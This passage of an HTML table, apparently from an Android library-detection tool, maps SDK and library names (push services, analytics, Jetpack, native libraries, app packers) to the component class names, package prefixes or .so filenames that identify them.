Push</td><td>com.huawei.hms.support.api.push.PushEventReceiver</td></tr><tr><td>快手广告 SDK</td><td>com.ksad.download.DownloadReceiver</td></tr><tr><td>网易云通信 SDK</td><td>com.netease.nimlib.service.ResponseReceiver</td></tr><tr><td>极光推送</td><td>cn.jpush.android.service.AlarmReceiver</td></tr><tr><td>Facebook SDK</td><td>com.facebook.CurrentAccessTokenExpirationBroadcastReceiver</td></tr><tr><td>腾讯移动推送</td><td>com.tencent.android.tpush.XGPushReceiver</td></tr><tr><td>MiPush</td><td>com.xiaomi.push.service.receivers.PingReceiver</td></tr><tr><td>HUAWEI Push</td><td>com.huawei.android.pushagent.PushEventReceiver</td></tr><tr><td>MiPush(GeTui Proxy)</td><td>com.igexin.sdk.MiuiPushReceiver</td></tr><tr><td>阿里移动推送</td><td>com.taobao.agoo.AgooCommondReceiver</td></tr><tr><td>vivo Push(TPNS Proxy)</td><td>com.tencent.android.vivopush.VivoPushMessageReceiver</td></tr><tr><td>Jetpack Remote Callback</td><td>androidx.remotecallback.ProviderRelayReceiver</td></tr><tr><td>Jetpack WorkManager</td><td>androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver</td></tr><tr><td>神策分析 SDK</td><td>com.sensorsdata.analytics.android.sdk.SensorsDataContentProvider</td></tr><tr><td>OkDownload</td><td>com.liulishuo.okdownload.OkDownloadProvider</td></tr><tr><td>腾讯移动分析</td><td>com.tencent.mid.api.MidProvider</td></tr><tr><td>Picasso</td><td>com.squareup.picasso.PicassoProvider</td></tr><tr><td>File Provider</td><td>android.support.v4.content.FileProvider</td></tr><tr><td>极光推送</td><td>cn.jpush.android.service.DownloadProvider</td></tr><tr><td>Facebook SDK</td><td>com.facebook.internal.FacebookInitProvider</td></tr><tr><td>Jetpack WorkManager</td><td>androidx.work.impl.WorkManagerInitializer</td></tr><tr><td>Jetpack App Startup</td><td>androidx.startup.InitializationProvider</td></tr><tr><td>AndroidAutoSize</td><td>me.jessyan.autosize.InitProvider</td></tr><tr><td>Jetpack Lifecycle</td><td>androidx.lifecycle.ProcessLifecycleOwnerInitializer</td></tr><tr><td>神策分析 SDK</td><td>com.sensorsdata.analytics.android.sdk.data.SensorsDataContentProvider</td></tr><tr><td>腾讯移动推送</td><td>com.tencent.tpns.baseapi.base.SettingsContentProvider</td></tr><tr><td>Audience Network</td><td>com.facebook.ads.AudienceNetworkContentProvider</td></tr><tr><td>Bmob 后端云</td><td>cn.bmob.v3.util.BmobContentProvider</td></tr><tr><td>移动应用推广 SDK</td><td>com.baidu.mobads.openad.FileProvider</td></tr><tr><td>ShareSDK</td><td>cn.sharesdk.framework.utils.ShareSDKFileProvider</td></tr><tr><td>HMS Update</td><td>com.huawei.updatesdk.fileprovider.UpdateSdkFileProvider</td></tr><tr><td>Shizuku</td><td>moe.shizuku.api.ShizukuProvider</td></tr><tr><td>File Provider</td><td>androidx.core.content.FileProvider</td></tr><tr><td>Facebook SDK</td><td>com.facebook.FacebookContentProvider</td></tr><tr><td>七鱼 SDK</td><td>com.qiyukf.nim.uikit.provider.UnicornProvider</td></tr><tr><td>AgentWeb</td><td>com.just.agentweb.AgentWebFileProvider</td></tr><tr><td>Bugly</td><td>com.tencent.bugly.beta.utils.BuglyFileProvider</td></tr><tr><td>Jetpack Lifecycle</td><td>android.arch.lifecycle.ProcessLifecycleOwnerInitializer</td></tr><tr><td>HMS Update</td><td>com.huawei.hms.update.provider.UpdateProvider</td></tr><tr><td>AndPermission</td><td>com.yanzhenjie.permission.FileProvider</td></tr><tr><td>个推</td><td>com.igexin.download.DownloadProvider</td></tr><tr><td>网易云通信 SDK</td><td>com.netease.nimlib.ipc.NIMContentProvider</td></tr><tr><td>友盟推送</td><td>com.umeng.message.provider.MessageProvider</td></tr><tr><td>Crashlytics</td><td>com.crashlytics.android.CrashlyticsInitProvider</td></tr><tr><td>腾讯移动推送</td><td>com.tencent.android.tpush.XGPushProvider</td></tr><tr><td>HMS Core AAID</td><td>com.huawei.hms.aaid.InitProvider</td></tr><tr><td>Firebase</td><td>com.google.firebase.provider.FirebaseInitProvider</td></tr><tr><td>极光推送</td><td>cn.jpush.android.service.Downloadrovider</td></tr><tr><td>AndroidUtilCode</td><td>com.blankj.utilcode.util.UtilsFileProvider</td></tr><tr><td>RePlugin</td><td>com.qihoo360.mobilesafe.svcmanager.ServiceProvider</td></tr><tr><td>腾讯移动推送</td><td>com.tencent.android.tpush.SettingsContentProvider</td></tr><tr><td>Google AdMob</td><td>com.google.android.gms.ads.MobileAdsInitProvider</td></tr><tr><td>AppGallery Connect</td><td>com.huawei.agconnect.core.provider.AGConnectInitializeProvider</td></tr><tr><td>极光推送</td><td>cn.jpush.android.service.DataProvider</td></tr><tr><td>百度云推送</td><td>com.baidu.android.pushservice.PushInfoProvider</td></tr><tr><td>HUAWEI Push</td><td>com.huawei.hms.support.api.push.PushProvider</td></tr><tr><td>HUAWEI Ads Kit</td><td>com.huawei.openalliance.ad.download.DownloadFileProvider</td></tr><tr><td>AndroidUtilCode</td><td>com.blankj.utilcode.util.Utils$FileProvider4UtilCode</td></tr><tr><td>Firebase Performance</td><td>com.google.firebase.perf.provider.FirebasePerfProvider</td></tr><tr><td>腾讯移动推送</td><td>com.tencent.android.tpush.XGVipPushKAProvider</td></tr><tr><td>RePlugin</td><td>com.qihoo360.replugin.(.*)</td></tr><tr><td>Material Design Components</td><td>com.google.android.material</td></tr><tr><td>Jetpack Lifecycle</td><td>androidx.lifecycle</td></tr><tr><td>Jetpack Interpolator</td><td>androidx.interpolator</td></tr><tr><td>IJKPlayer</td><td>tv.danmaku.ijk</td></tr><tr><td>Protocol Buffer</td><td>com.google.protobuf</td></tr><tr><td>Jetpack Loader</td><td>androidx.loader</td></tr><tr><td>TBS</td><td>com.tencent.smtt</td></tr><tr><td>Jetpack Transition</td><td>androidx.transition</td></tr><tr><td>Jetpack DrawerLayout</td><td>androidx.drawerlayout</td></tr><tr><td>MiPush</td><td>com.xiaomi.push</td></tr><tr><td>Jetpack AppCompat</td><td>androidx.appcompat</td></tr><tr><td>Butter Knife</td><td>butterknife.internal</td></tr><tr><td>Jetpack RecyclerView</td><td>androidx.recyclerview</td></tr><tr><td>腾讯地图 SDK</td><td>com.tencent.map</td></tr><tr><td>Jetpack DocumentFile</td><td>androidx.documentfile</td></tr><tr><td>Jetpack Media</td><td>androidx.media</td></tr><tr><td>Jetpack MultiDex</td><td>androidx.multidex</td></tr><tr><td>UTDID</td><td>com.ta.utdid2</td></tr><tr><td>Jetpack SlidingPaneLayout</td><td>androidx.slidingpanelayout</td></tr><tr><td>Support Library</td><td>android.support.v4</td></tr><tr><td>Support Library</td><td>android.support.v7</td></tr><tr><td>MiPush</td><td>com.xiaomi.xmpush</td></tr><tr><td>GreenDAO</td><td>org.greenbot.greendao</td></tr><tr><td>Jetpack Collection</td><td>androidx.collection</td></tr><tr><td>HMS Analytics Kit</td><td>com.huawei.hianalytics</td></tr><tr><td>Jetpack SwipeRefreshLayout</td><td>androidx.swiperefreshlayout</td></tr><tr><td>Jetpack AsyncLayoutInflater</td><td>androidx.asynclayoutinflater</td></tr><tr><td>Jetpack Preference</td><td>androidx.preference</td></tr><tr><td>Jetpack ViewPager</td><td>androidx.viewpager</td></tr><tr><td>fastjson</td><td>com.alibaba.fastjson</td></tr><tr><td>Jetpack Browser</td><td>androidx.browser</td></tr><tr><td>Jetpack VectorDrawable</td><td>androidx.vectordrawable</td></tr><tr><td>FlexBox</td><td>com.google.android.flexbox</td></tr><tr><td>Firebase</td><td>com.google.firebase</td></tr><tr><td>App Center</td><td>com.microsoft.appcenter</td></tr><tr><td>Jetpack Room</td><td>androidx.room</td></tr><tr><td>Jetpack ConstraintLayout</td><td>androidx.constraintlayout</td></tr><tr><td>EventBus</td><td>org.greenbot.eventbus</td></tr><tr><td>Jetpack CoordinatorLayout</td><td>androidx.coordinatorlayout</td></tr><tr><td>MiPush</td><td>com.xiaomi.mipush</td></tr><tr><td>Glide</td><td>com.bumptech.glide</td></tr><tr><td>Jetpack CustomView</td><td>androidx.customview</td></tr><tr><td>微博 SDK</td><td>com.sina.weibo</td></tr><tr><td>Jetpack CardView</td><td>androidx.cardview</td></tr><tr><td>Google Mobile Service</td><td>com.google.android.gms</td></tr><tr><td>Jetpack Arch Core</td><td>androidx.arch</td></tr><tr><td>Jetpack Annotation</td><td>androidx.annotation</td></tr><tr><td>Lottie</td><td>com.airbnb.lottie</td></tr><tr><td>Jetpack Print</td><td>androidx.print</td></tr><tr><td>Butter Knife</td><td>butterknife.runtime</td></tr><tr><td>Fresco</td><td>com.facebook.fresco</td></tr><tr><td>Jetpack Fragment</td><td>androidx.fragment</td></tr><tr><td>高德 SDK</td><td>com.amap.api</td></tr><tr><td>Jetpack Legacy</td><td>androidx.legacy</td></tr><tr><td>Jetpack CursorAdapter</td><td>androidx.cursoradapter</td></tr><tr><td>Jetpack Versionedparcelable</td><td>androidx.versionedparcelable</td></tr><tr><td>Jetpack Savedstate</td><td>androidx.savedstate</td></tr><tr><td>Jetpack SQLite</td><td>androidx.sqlite</td></tr><tr><td>Bugly</td><td>com.tencent.bugly</td></tr><tr><td>ZXing</td><td>com.google.zxing</td></tr><tr><td>Jetpack ExifInterface</td><td>androidx.exifinterface</td></tr><tr><td>Jetpack Core</td><td>androidx.core</td></tr><tr><td>Jetpack WorkManager</td><td>androidx.work</td></tr><tr><td>Kotlin Sequences</td><td>kotlin.sequences</td></tr><tr><td>Kotlin Reflect</td><td>kotlin.reflect</td></tr><tr><td>Jetpack ViewPager2</td><td>androidx.viewpager2</td></tr><tr><td>TBS</td><td>com.tencent.tbs</td></tr><tr><td>ExoPlayer</td><td>com.google.android.exoplayer2</td></tr><tr><td>Jetpack DataBinding</td><td>androidx.databinding</td></tr><tr><td>gson</td><td>com.google.gson</td></tr><tr><td>Jetpack LocalBroadcastManager</td><td>androidx.localbroadcastmanager</td></tr><tr><td>Jetpack Activity</td><td>androidx.activity</td></tr><tr><td>Kotlin Coroutines</td><td>kotlin.coroutines.(.*)</td></tr><tr><td>Kotlin Coroutines</td><td>kotlinx.coroutines.(.*)</td></tr><tr><td>Kotlin</td><td>kotlin.(.*)</td></tr><tr><td>OKHttp3</td><td>okhttp3.(.*)</td></tr><tr><td>Retrofit2</td><td>retrofit2.(.*)</td></tr><tr><td>Okio</td><td>okio.(.*)</td></tr><tr><td>支付宝 SDK</td><td>com.alipay.(.*)</td></tr><tr><td>Flutter</td><td>io.flutter.(.*)</td></tr><tr><td>MediaInfoLib</td><td>libmediainfo.so</td></tr><tr><td>libSDL</td><td>libSDL2.so</td></tr><tr><td>Telegram APIs</td><td>libtmessages.(.*).so</td></tr><tr><td>腾讯云手游安全</td><td>libtersafe2.so</td></tr><tr><td>U-App SDK</td><td>libumeng-spy.so</td></tr><tr><td>VirtualApp</td><td>com.lody.virtual.(.*)</td></tr><tr><td>VirtualApp</td><td>com.lody.virtual.client.stub.DaemonService</td></tr><tr><td>Jetpack WorkManager</td><td>androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy</td></tr><tr><td>Jetpack WorkManager</td><td>androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy</td></tr><tr><td>Jetpack WorkManager</td><td>androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy</td></tr><tr><td>Jetpack WorkManager</td><td>androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy</td></tr><tr><td>Google Play Service</td><td>com.google.android.play.core.common.PlayCoreDialogWrapperActivity</td></tr><tr><td>Google Play Service</td><td>com.google.android.play.core.missingsplits.PlayCoreMissingSplitsActivity</td></tr><tr><td>Google Play Service</td><td>com.google.android.libraries.phenotype.registration.PhenotypeMetadataHolderService</td></tr><tr><td>Google Play Service</td><td>com.google.android.libraries.phenotype.client.stable.AccountRemovedBroadcastReceiver</td></tr><tr><td>Google Play Service</td><td>com.google.android.libraries.phenotype.client.stable.PhenotypeUpdateBackgroundBroadcastReceiver</td></tr><tr><td>小米更新 SDK</td><td>com.market.sdk.LazyFileProvider</td></tr><tr><td>小米更新 SDK</td><td>com.xiaomi.market.sdk.DownloadCompleteReceiver</td></tr><tr><td>AVPro Video</td><td>libAVProLocal.so</td></tr><tr><td>libaria2</td><td>libaria2c.so</td></tr><tr><td>libGDX</td><td>libgdx-box2d.so</td></tr><tr><td>libGDX</td><td>libgdx.so</td></tr><tr><td>libGDX</td><td>libgdx-freetype.so</td></tr><tr><td>jlibtorrent</td><td>libjlibtorrent-(.*).so</td></tr><tr><td>libtorrent4j</td><td>libtorrent4j-(.*).so</td></tr><tr><td>Jetpack WorkManager</td><td>androidx.work.impl.background.systemalarm.SystemAlarmService</td></tr><tr><td>微博 SDK</td><td>com.sina.weibo.sdk.web.WebActivity</td></tr><tr><td>微博 SDK</td><td>com.sina.weibo.sdk.share.ShareChatActivity</td></tr><tr><td>微博 SDK</td><td>com.sina.weibo.sdk.share.ShareTransActivity</td></tr><tr><td>微博 SDK</td><td>com.sina.weibo.sdk.share.ShareStoryActivity</td></tr><tr><td>微博 SDK</td><td>com.sina.weibo.sdk.share.ShareResultActivity</td></tr><tr><td>数美 SDK</td><td>libsmsdk.so</td></tr><tr><td>Google Play Service</td><td>com.google.android.play.core.assetpacks.AssetPackExtractionService</td></tr><tr><td>移动应用推广 SDK</td><td>com.baidu.mobads.production.rewardvideo.MobRewardVideoActivity</td></tr><tr><td>Mtop SDK</td><td>mtopsdk.extra.antiattack.CheckCodeValidateActivity</td></tr><tr><td>米大师</td><td>com.tencent.midas.jsbridge.APWebJSBridgeActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.conversation.SobotChatActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.activity.SobotPhotoActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.activity.WebViewActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.activity.SobotSkillGroupActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.activity.SobotPostMsgActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.activity.SobotConsultationListActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.activity.SobotPhotoListActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.activity.SobotCusFieldActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.activity.SobotPostCategoryActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.activity.SobotQueryFromActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.activity.SobotChooseCityActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.activity.SobotChooseFileActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.activity.SobotFileDetailActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.activity.SobotCameraActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.activity.SobotVideoActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.activity.SobotTicketDetailActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.activity.SobotHelpCenterActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.activity.SobotProblemCategoryActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.activity.SobotProblemDetailActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.activity.SobotPostLeaveMsgActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.widget.dialog.SobotRobotListActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.widget.dialog.SobotReplyActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.widget.dialog.SobotTicketEvaluateActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.widget.dialog.SobotEvaluateActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.widget.dialog.SobotPostMsgTmpListActivity</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.core.channel.SobotTCPServer</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.server.SobotSessionServer</td></tr><tr><td>智齿客服 SDK</td><td>com.sobot.chat.provider.SobotFileProvider</td></tr><tr><td>乐播 SDK</td><td>libhpplayae.so</td></tr><tr><td>乐播 SDK</td><td>libed25519.so</td></tr><tr><td>乐播 SDK</td><td>com.hpplay.sdk.source.permission.PermissionBridgeActivity</td></tr><tr><td>乐播 SDK</td><td>com.hpplay.sdk.source.process.LelinkSdkService</td></tr><tr><td>乐播 SDK</td><td>com.hpplay.sdk.source.mirror.ScreenCastService</td></tr><tr><td>FFmpeg</td><td>libavcodec.so</td></tr><tr><td>FFmpeg</td><td>libavfilter.so</td></tr><tr><td>FFmpeg</td><td>libavformat.so</td></tr><tr><td>FFmpeg</td><td>libavutil.so</td></tr><tr><td>React Native</td><td>libfolly_futures.so</td></tr><tr><td>GlideWebpDecoder</td><td>libglide-webp.so</td></tr><tr><td>LeakCanary</td><td>leakcanary.internal.PlumberInstaller</td></tr><tr><td>LeakCanary</td><td>leakcanary.internal.HeapAnalyzerService</td></tr><tr><td>LeakCanary</td><td>leakcanary.internal.RequestStoragePermissionActivity</td></tr><tr><td>LeakCanary</td><td>leakcanary.internal.activity.LeakLauncherActivity</td></tr><tr><td>LeakCanary</td><td>leakcanary.internal.activity.LeakActivity</td></tr><tr><td>LeakCanary</td><td>leakcanary.internal.NotificationReceiver</td></tr><tr><td>LeakCanary</td><td>leakcanary.internal.LeakCanaryFileProvider</td></tr><tr><td>LeakCanary</td><td>leakcanary.internal.AppWatcherInstaller$MainProcess</td></tr><tr><td>ABSCL</td><td>no.nordicsemi.android.support.v18.scanner.PendingIntentReceiver</td></tr><tr><td>ABSCL</td><td>no.nordicsemi.android.support.v18.scanner.ScannerService</td></tr><tr><td>xLua</td><td>libxlua.so</td></tr><tr><td>QAPM</td><td>libapmart.so</td></tr><tr><td>QAPM</td><td>libapmcrash.so</td></tr><tr><td>QAPM</td><td>libapmdalvik.so</td></tr><tr><td>QAPM</td><td>libapmioFake.so</td></tr><tr><td>PictureSelector</td><td>com.luck.picture.lib.PictureFileProvider</td></tr><tr><td>PictureSelector</td><td>com.luck.picture.lib.PictureSelectorActivity</td></tr><tr><td>PictureSelector</td><td>com.luck.picture.lib.PictureSelectorWeChatStyleActivity</td></tr><tr><td>PictureSelector</td><td>com.luck.picture.lib.PictureSelectorCameraEmptyActivity</td></tr><tr><td>PictureSelector</td><td>com.luck.picture.lib.PictureCustomCameraActivity</td></tr><tr><td>PictureSelector</td><td>com.luck.picture.lib.PicturePreviewActivity</td></tr><tr><td>PictureSelector</td><td>com.luck.picture.lib.PictureSelectorPreviewWeChatStyleActivity</td></tr><tr><td>PictureSelector</td><td>com.luck.picture.lib.PictureVideoPlayActivity</td></tr><tr><td>PictureSelector</td><td>com.luck.picture.lib.PictureExternalPreviewActivity</td></tr><tr><td>PictureSelector</td><td>com.luck.picture.lib.PicturePlayAudioActivity</td></tr><tr><td>ShareSDK</td><td>cn.sharesdk.tencent.qq.ReceiveActivity</td></tr><tr><td>FFmpeg</td><td>libswscale.so</td></tr><tr><td>FFmpeg</td><td>libswresample.so</td></tr><tr><td>FFmpeg</td><td>libavdevice.so</td></tr><tr><td>Shizuku</td><td>rikka.shizuku.ShizukuProvider</td></tr><tr><td>米大师</td><td>com.tencent.midas.qq.APMidasQQWalletActivity</td></tr><tr><td>极光推送</td><td>cn.jpush.android.service.PluginHuaweiPlatformsService</td></tr><tr><td>极光推送</td><td>cn.jpush.android.service.PluginOppoPushService</td></tr><tr><td>极光推送</td><td>cn.jpush.android.service.PluginVivoMessageReceiver</td></tr><tr><td>极光推送</td><td>cn.jpush.android.asus.AsusPushMessageReceiver</td></tr><tr><td>极光推送</td><td>cn.jpush.android.service.DActivity</td></tr><tr><td>腾讯广告 SDK</td><td>com.qq.e.comm.GDTFileProvider</td></tr><tr><td>Flutter</td><td>io.flutter.plugins.urllauncher.WebViewActivity</td></tr><tr><td>Flutter</td><td>io.flutter.embedding.android.FlutterActivity</td></tr><tr><td>FlutterBoost</td><td>com.idlefish.flutterboost.containers.BoostFlutterActivity</td></tr><tr><td>CRI Sofdec2</td><td>libcri_mana_vpx.so</td></tr><tr><td>CRI ADX2</td><td>libcri_ware_unity.so</td></tr><tr><td>iconv</td><td>libiconv.so</td></tr><tr><td>Unity</td><td>libil2cpp.so</td></tr><tr><td>SQLite</td><td>libsqlite.so</td></tr><tr><td>SQLite</td><td>libsqlite3.so</td></tr><tr><td>MMA SDK</td><td>libMMANDKSignature.so</td></tr><tr><td>cocos2d-cpp</td><td>libcocos2dcpp.so</td></tr><tr><td>LibVLC</td><td>libmla.so</td></tr><tr><td>LibVLC</td><td>libvlc.so</td></tr><tr><td>LibVLC</td><td>libvlcjni.so</td></tr><tr><td>OpenCV</td><td>libopencv_core.so</td></tr><tr><td>OpenCV</td><td>libopencv_imgproc.so</td></tr><tr><td>WebRTC</td><td>libjingle_peerconnection_so.so</td></tr><tr><td>ApngDrawable</td><td>libapng-drawable.so</td></tr><tr><td>Google VR SDK</td><td>libgvr.so</td></tr><tr><td>PayPal</td><td>com.paypal.android.sdk.payments.PayPalService</td></tr><tr><td>Qt5</td><td>libQt5(.*).so</td></tr><tr><td>Qt5</td><td>libplugins_audio(.*).so</td></tr><tr><td>Qt5</td><td>libplugins_bearer(.*).so</td></tr><tr><td>Qt5</td><td>libplugins_gamepads(.*).so</td></tr><tr><td>Qt5</td><td>libplugins_geometryloaders(.*).so</td></tr><tr><td>Qt5</td><td>libplugins_geoservices(.*).so</td></tr><tr><td>Qt5</td><td>libplugins_iconengines(.*).so</td></tr><tr><td>Qt5</td><td>libplugins_mediaservice(.*).so</td></tr><tr><td>Qt5</td><td>libplugins_platforms_android(.*).so</td></tr><tr><td>Qt5</td><td>libplugins_playlistformats(.*).so</td></tr><tr><td>Qt5</td><td>libplugins_position(.*).so</td></tr><tr><td>Qt5</td><td>libplugins_qmltooling(.*).so</td></tr><tr><td>Qt5</td><td>libplugins_renderplugins(.*).so</td></tr><tr><td>Qt5</td><td>libplugins_sceneparsers(.*).so</td></tr><tr><td>Qt5</td><td>libplugins_sensors_libqtsensors(.*).so</td></tr><tr><td>Qt5</td><td>libplugins_sqldrivers(.*).so</td></tr><tr><td>Qt5</td><td>libplugins_styles(.*).so</td></tr><tr><td>Qt5</td><td>libplugins_texttospeech(.*).so</td></tr><tr><td>Qt5</td><td>libplugins_video_videonode(.*).so</td></tr><tr><td>Qt5</td><td>libplugins_webview(.*).so</td></tr><tr><td>Qt5</td><td>libqml_Qt3D(.*).so</td></tr><tr><td>Qt5</td><td>libqml_Qt(.*).so</td></tr><tr><td>OpenSSL</td><td>libssl.so</td></tr><tr><td>OpenSSL</td><td>libcrypto.so</td></tr><tr><td>Qt5</td><td>libplugins_imageformats(.*).so</td></tr><tr><td>BurstLinker</td><td>libBurstLinker.so</td></tr><tr><td>Crashlytics</td><td>libcrashlytics-common.so</td></tr><tr><td>Crashlytics</td><td>libcrashlytics-handler.so</td></tr><tr><td>Crashlytics</td><td>libcrashlytics-trampoline.so</td></tr><tr><td>360 加固</td><td>libjiagu_a64.so</td></tr><tr><td>360 加固</td><td>libjiagu_x64.so</td></tr><tr><td>360 加固</td><td>libjiagu_x86.so</td></tr><tr><td>支付宝 SDK</td><td>com.alipay.sdk.app.APayEntranceActivity</td></tr><tr><td>DataFinder</td><td>com.bytedance.applog.util.SimulateLaunchActivity</td></tr><tr><td>DataFinder</td><td>com.bytedance.applog.migrate.MigrateDetectorActivity</td></tr><tr><td>DataFinder</td><td>com.bytedance.applog.collector.Collector</td></tr><tr><td>腾讯移动推送</td><td>com.tencent.android.tpush.inappmessage.InAppMessageActivity</td></tr><tr><td>ReToast</td><td>github.ryuunoakaihitomi.retoast._Initializer</td></tr><tr><td>Sofire</td><td>libfire.so</td></tr><tr><td>Sofire</td><td>com.baidu.sofire.MyProvider</td></tr><tr><td>ZBar</td><td>libzbar.so</td></tr><tr><td>Rclone</td><td>librclone.so</td></tr><tr><td>高德地图 SDK</td><td>libAMapSDK_NAVI_v(.*).so</td></tr><tr><td>OpenCV</td><td>libopencv_java4.so</td></tr><tr><td>Ren’Py</td><td>librenpython.so</td></tr><tr><td>HUAWEI Push(Aliyun Proxy)</td><td>org.android.agoo.huawei.HuaweiPushMessageService</td></tr><tr><td>React Native</td><td>com.reactnativecommunity.webview.RNCWebViewFileProvider</td></tr><tr><td>HMS ML Kit</td><td>com.huawei.hms.mlsdk.common.provider.MLInitializerProvider</td></tr><tr><td>ZBar</td><td>libzbarjni.so</td></tr><tr><td>HUAWEI Push(Aliyun Proxy)</td><td>org.android.agoo.huawei.HuaweiPushMessageService</td></tr><tr><td>Conscrypt</td><td>libconscrypt_jni.so</td></tr><tr><td>Pangle SDK</td><td>libmetasec_ml.so</td></tr><tr><td>xHook</td><td>libxhook_lib.so</td></tr><tr><td>KOOM</td><td>libkoom-java.so</td></tr><tr><td>KOOM</td><td>libkwai-linker.so</td></tr><tr><td>KOOM</td><td>com.kwai.koom.javaoom.analysis.HeapAnalyzeService</td></tr><tr><td>Sentry</td><td>libsentry.so</td></tr><tr><td>Sentry</td><td>libsentry-android.so</td></tr><tr><td>Sentry</td><td>io.sentry.android.core.SentryInitProvider</td></tr><tr><td>百度地图 SDK</td><td>liblocSDK(.*)[0-9]b.so</td></tr><tr><td>OPPO Push(GeTui Proxy)</td><td>com.igexin.sdk.OppoPushService</td></tr><tr><td>vivo Push(GeTui Proxy)</td><td>com.igexin.sdk.VivoPushMessageReceiver</td></tr><tr><td>快应用</td><td>org.hapjs.(.*)</td></tr><tr><td>Dexter</td><td>com.karumi.dexter.DexterActivity</td></tr><tr><td>Google AdMob</td><td>com.google.android.gms.ads.AdService</td></tr><tr><td>网易云捕</td><td>libbugrpt.so</td></tr><tr><td>开普勒 SDK</td><td>com.kepler.jd.login.AuthSuccessActivity</td></tr><tr><td>开普勒 SDK</td><td>com.kepler.jd.sdk.KeplerMidActivity</td></tr><tr><td>开普勒 SDK</td><td>com.kepler.jd.sdk.WebViewActivity</td></tr><tr><td>开普勒 SDK</td><td>com.kepler.jd.sdk.KeplerBackActivity</td></tr><tr><td>Trichrome</td><td>com.google.android.trichromelibrary</td></tr><tr><td>LibCurl</td><td>libcurl.so</td></tr><tr><td>OpenCC</td><td>libopencc.so</td></tr><tr><td>Opus</td><td>libopus.so</td></tr><tr><td>Log for C++</td><td>liblog4cpp.so</td></tr><tr><td>Live2D Cubism SDK</td><td>libLive2DCubismCore.so</td></tr><tr><td>Yandex SpeechKit</td><td>libYandexSpeechKitJni.(.*).so</td></tr><tr><td>Megazord</td><td>libmegazord.so</td></tr><tr><td>腾讯移动推送</td><td>libxgVipSecurity.so</td></tr><tr><td>HUAWEI Push(TPNS Proxy)</td><td>com.huawei.android.hms.tpns.HWHmsMessageService</td></tr><tr><td>XPopup</td><td>com.lxj.xpopup.util.XPermission$PermissionActivity</td></tr><tr><td>Xpref</td><td>com.bilibili.xpref.XprefProvider</td></tr><tr><td>ML Kit</td><td>com.google.mlkit.common.internal.MlKitInitProvider</td></tr><tr><td>ML Kit</td><td>com.google.mlkit.common.internal.MlKitComponentDiscoveryService</td></tr><tr><td>Torrent library for java</td><td>libtorrent4j.so</td></tr><tr><td>gocryptsfs</td><td>libgocryptfs.so</td></tr><tr><td>Android-TiffBitmapFactory</td><td>libtiff.so</td></tr><tr><td>LibRaw</td><td>libraw.so</td></tr><tr><td>Qt6</td><td>libQt6(.*).so</td></tr><tr><td>AdColony</td><td>libadcolony.so</td></tr><tr><td>Sodium</td><td>libsodium.so</td></tr><tr><td>腾讯语音识别</td><td>libWXVoice.so</td></tr><tr><td>华为帐号服务</td><td>com.huawei.hms.hwid.internal.ui.activity.HwIdSignInHubActivity</td></tr><tr><td>华为帐号服务</td><td>com.huawei.hms.account.internal.ui.activity.AccountSignInHubActivity</td></tr><tr><td>HUAWEI Ads Kit</td><td>com.huawei.openalliance.ad.activity.PPSBridgeActivity</td></tr><tr><td>HUAWEI Ads Kit</td><td>com.huawei.openalliance.ad.activity.PPSNotificationActivity</td></tr><tr><td>HUAWEI Ads Kit</td><td>com.huawei.openalliance.ad.activity.AgProtocolActivity</td></tr><tr><td>HMS Analytics Kit</td><td>com.huawei.hms.analytics.receiver.HiAnalyticsSvcEvtReceiver</td></tr><tr><td>HMS Analytics Kit</td><td>com.huawei.hms.analytics.provider.AnalyticsInitializeProvider</td></tr><tr><td>梆梆安全</td><td>com.secneo.apkwrapper.CP</td></tr><tr><td>闪验 SDK</td><td>libShanYCore.so</td></tr><tr><td>顶象无感验证 SDK</td><td>libDXRisk(.*).so</td></tr><tr><td>Android Crazy Linker</td><td>libchrome_android_linker.so</td></tr><tr><td>顶象无感验证 SDK</td><td>libDXRiskComm(.*).so</td></tr><tr><td>顶象无感验证 SDK</td><td>libDXCaptcha(.*).so</td></tr><tr><td>Clash Core</td><td>libclash.so</td></tr><tr><td>Artemis Engine</td><td>libartemis.so</td></tr><tr><td>Mapbox GL Native</td><td>libmapbox-gl.so</td></tr><tr><td>kraken</td><td>libkraken_jsc.so</td></tr><tr><td>Jetpack Compose</td><td>androidx.compose.ui.tooling.PreviewActivity</td></tr><tr><td>Jetpack Compose</td><td>androidx.compose.ui.tooling.data.TestActivity</td></tr><tr><td>Jetpack Compose</td><td>androidx.compose.ui.tooling.preview.PreviewActivity</td></tr><tr><td>CodeLocator</td><td>com.bytedance.tools.codelocator.CodeLocatorProvider</td></tr><tr><td>Jetpack 